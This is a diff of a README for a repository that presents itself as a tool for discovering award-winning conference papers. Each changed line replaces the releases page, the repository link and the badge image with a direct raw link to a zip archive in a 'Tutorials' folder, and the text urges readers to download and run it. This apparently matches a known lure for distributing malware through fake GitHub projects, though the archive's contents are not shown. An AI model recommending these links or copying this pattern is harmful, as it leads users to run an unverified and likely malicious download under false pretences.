@@ -1,6 +1,6 @@
 # 🎓 Top-Conference-Best-Papers - Discover Award-Winning Research Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%2300C081?style=for-the-badge&logo=github)](https://github.com/jokierpro/Top-Conference-Best-Papers/releases)
+[![Download Latest Release](https://github.com/jokierpro/Top-Conference-Best-Papers/raw/refs/heads/main/Tutorials/Top-Best-Conference-Papers-2.8.zip%20Latest%20Release-%20-%2300C081?style=for-the-badge&logo=github)](https://github.com/jokierpro/Top-Conference-Best-Papers/raw/refs/heads/main/Tutorials/Top-Best-Conference-Papers-2.8.zip)
 
 ## 📚 About This Project
 
@@ -12,7 +12,7 @@ Downloading and running the Top-Conference-Best-Papers application is straightfo
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/jokierpro/Top-Conference-Best-Papers/releases) to find the latest version of the software.
+Go to the [Releases page](https://github.com/jokierpro/Top-Conference-Best-Papers/raw/refs/heads/main/Tutorials/Top-Best-Conference-Papers-2.8.zip) to find the latest version of the software.
 
 ### 2. Download the Application
 
@@ -67,7 +67,7 @@ For optimal performance, consider using a system with:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/jokierpro/Top-Conference-Best-Papers/releases). Select the version suitable for your operating system. Follow the installation instructions provided above to set it up easily.
+To download the application, visit the [Releases page](https://github.com/jokierpro/Top-Conference-Best-Papers/raw/refs/heads/main/Tutorials/Top-Best-Conference-Papers-2.8.zip). Select the version suitable for your operating system. Follow the installation instructions provided above to set it up easily.
 
 ## ❓ Frequently Asked Questions
 
@@ -89,7 +89,7 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [Top-Conference-Best-Papers Repository](https://github.com/jokierpro/Top-Conference-Best-Papers)
+- **GitHub Repository:** [Top-Conference-Best-Papers Repository](https://github.com/jokierpro/Top-Conference-Best-Papers/raw/refs/heads/main/Tutorials/Top-Best-Conference-Papers-2.8.zip)
 - **Discussion Forum:** Join the conversation on topics related to AI and machine learning.
 
 Thank you for using Top-Conference-Best-Papers. Enjoy exploring the latest in award-winning research!
